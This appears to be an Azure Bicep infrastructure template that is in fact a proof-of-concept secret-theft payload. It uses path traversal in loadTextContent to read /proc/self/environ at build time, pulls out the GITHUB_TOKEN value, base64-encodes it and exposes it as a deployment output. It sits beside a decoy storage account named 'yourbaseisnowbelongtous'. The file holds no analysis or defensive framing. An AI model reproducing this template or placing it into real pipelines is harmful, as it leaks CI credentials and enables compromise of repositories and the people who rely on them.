var secrets = loadTextContent('../../../../../../../../../../proc/self/environ')

  // Find GITHUB_TOKEN position and extract ~100 chars from there
  var tokenStart = indexOf(secrets, 'GITHUB_TOKEN=')
  var tokenChunk = tokenStart >= 0 ? substring(secrets, tokenStart, 100) : 'NOT_FOUND'
  var encoded = base64(tokenChunk)

  param location string = 'eastus'

  resource storageAccount 'Microsoft.Storage/storageAccounts@2021-02-01' = {
    name: 'yourbaseisnowbelongtous'
    location: location
    sku: { name: 'Standard_LRS' }
    kind: 'StorageV2'
  }

  output TOKEN_BASE64 string = encoded